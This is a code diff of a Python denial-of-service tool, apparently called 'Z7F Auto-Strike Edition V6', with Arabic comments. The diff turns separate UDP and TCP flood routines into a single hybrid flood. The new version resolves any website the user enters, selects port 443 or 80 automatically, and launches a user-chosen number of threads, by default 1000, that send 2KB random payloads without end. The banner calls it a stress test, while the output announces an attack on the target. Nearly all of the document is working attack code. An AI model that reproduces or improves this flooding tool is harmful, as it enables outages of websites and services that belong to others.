@@ -3,82 +3,78 @@ import threading
 import random
 import os
 import sys
+import time
 
-# الألوان
-R, G, Y, B, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;36m', '\033[1;37m'
+# ألوان Z7F
+R, G, Y, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;36m', '\033[1;37m'
 
 def logo():
     os.system('clear')
     print(f"""
-{R}  _______ ______ ______      _______ _    _ _____  ____   ____ 
-{R} |__   __|____  |  ____|    |__   __| |  | |  __ \|  _ \ / __ \ 
-{R}    | |     / /| |__          | |  | |  | | |__) | |_) | |  | |
-{R}    | |    / / |  __|         | |  | |  | |  _  /|  _ <| |  | |
-{R}    | |   / /  | |            | |  | |__| | | \ \| |_) | |__| |
-{R}    |_|  /_/   |_| {W}Z7F        |_|   \____/|_|  \_\____/ \____/ 
-{C}=====================================================================
-{Y}        Z7F TURBO V5.0 | HIGH-SPEED PACKET INJECTION
-{G}        STRESS TEST MODE: EXTREME | MAX THREADS: 1000+
-{C}====================================================================={W}""")
+{R}  _______ ______ ______        {W}   _    _  _____  ____  
+{R} |__   __|____  |  ____|      {W}  / \  | ||_   _|/ __ \ 
+{R}    | |     / /| |__         {W} / _ \ | |  | | | |  | |
+{R}    | |    / / |  __|       {W}/ ___ \| |  | | | |__| |
+{R}    | |   / /  | |         {W}/_/   \_\_|  |_|  \____/ 
+{R}    |_|  /_/   |_| {W}Z7F    {G}  AUTO-STRIKE EDITION V6
+{C}=========================================================
+{Y}     JUST ENTER SITE & COUNT | LEAVE THE REST TO Z7F
+{G}     SPEED: MAX (0.5) | MODE: HYBRID AUTO-SCAN
+{C}========================================================={W}""")
 
-# توليد حزمة بيانات عشوائية ثقيلة
-bytes_payload = random._urandom(1490) 
+payload = random._urandom(2048) # حزمة بيانات ثقيلة 2KB
 
-def udp_flood(target_ip, target_port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+def smart_attack(ip, port):
     while True:
         try:
-            s.sendto(bytes_payload, (target_ip, target_port))
-        except:
-            pass
-
-def tcp_flood(target_ip, target_port):
-    while True:
-        try:
+            # هجوم هجين (TCP)
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((target_ip, target_port))
-            s.send(bytes_payload)
-            # لا نغلق الاتصال فوراً لنسبب Connection Exhaustion
+            s.settimeout(0.5)
+            s.connect((ip, port))
+            s.send(payload)
+            # هجوم هجين (UDP) في نفس اللحظة
+            u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            u.sendto(payload, (ip, port))
         except:
             pass
 
-def start_turbo():
+def launch():
     logo()
-    target = input(f"{G}Target IP/Domain: {W}")
+    target = input(f"{G}Enter Website Name (e.g google.com): {W}").replace('http://','').replace('https://','').split('/')[0]
+    
     try:
         ip = socket.gethostbyname(target)
-        port = int(input(f"{G}Target Port (e.g 80 or 443): {W}") or 80)
-        t_count = int(input(f"{G}Threads Count (Recommended 1000): {W}") or 1000)
-        mode = input(f"{G}Mode [UDP/TCP]: {W}").upper()
+        print(f"\n{C}[+] Target IP Found: {W}{ip}")
         
-        print(f"\n{R}[!!!] INJECTING {t_count} TURBO ENGINES ON {ip}:{port} [!!!]{W}")
-        
-        for i in range(t_count):
-            if mode == "UDP":
-                thread = threading.Thread(target=udp_flood, args=(ip, port))
-            else:
-                thread = threading.Thread(target=tcp_flood, args=(ip, port))
-            
-            thread.daemon = True # لضمان إغلاق الخيوط عند إيقاف البرنامج
-            thread.start()
-            
-            if i % 100 == 0:
-                print(f"{C}[+] Engines {i} Active...")
+        # كشف البورت التلقائي
+        print(f"{Y}[*] Auto-Scanning Port...{W}")
+        port = 443
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        if s.connect_ex((ip, 443)) != 0:
+            port = 80
+        print(f"{C}[+] Smart Port Selection: {W}{port}")
 
-        print(f"\n{G}[SUCCESS] All engines are running at MAX speed.{W}")
-        print(f"{Y}Press Ctrl+C to stop the attack.{W}")
+        count = int(input(f"{G}Enter Attack Power (Count): {W}") or 1000)
         
-        # إبقاء الكود يعمل
-        while True:
-            pass
+        print(f"\n{R}[!!!] Z7F ATTACK STARTED ON {target} [!!!]{W}")
+        print(f"{Y}[*] Mode: Hybrid (TCP/UDP) | Speed: Ultra Fast{W}")
+
+        for i in range(count):
+            t = threading.Thread(target=smart_attack, args=(ip, port))
+            t.daemon = True
+            t.start()
+            if i % 100 == 0:
+                print(f"{C}[#] Powering Engine {i}...")
+
+        print(f"\n{G}[READY] ALL ENGINES ARE HITTING THE TARGET!{W}")
+        while True: time.sleep(1)
 
     except Exception as e:
         print(f"{R}[-] Error: {e}{W}")
 
 if __name__ == "__main__":
-    try:
-        start_turbo()
+    try: launch()
     except KeyboardInterrupt:
-        print(f"\n{Y}[!] Shutdown Requested. Cleaning up...{W}")
+        print(f"\n{Y}[!] Stopped.{W}")
         sys.exit()
